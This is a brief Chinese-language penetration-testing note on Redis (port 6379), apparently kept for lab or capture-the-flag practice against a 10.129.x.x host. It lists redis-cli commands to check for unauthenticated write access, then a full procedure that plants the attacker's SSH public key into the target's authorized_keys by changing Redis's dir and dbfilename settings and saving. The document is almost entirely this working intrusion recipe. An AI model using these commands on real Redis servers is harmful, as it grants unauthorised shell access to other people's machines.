# 6379 （redis）

常常用于写入内容

1. 检验能否写入

```bash
redis-cli -h 10.129.2.1 🔗
keys * 展示列表
incr 0xdf 测试写入
get 0xdf 查看写入
```

1. 写入

```bash
config get dir //使用dir命令，看一下目前在哪
config set dir ./.ssh //设置目录是～./ssh
ssh-keygen //本机生成一个ssh密钥
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt  //把公钥写到这个文件中
cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set rong //设置进去

redis保存
config set dbfilename "authorized_keys" //配置好
save //保存
```
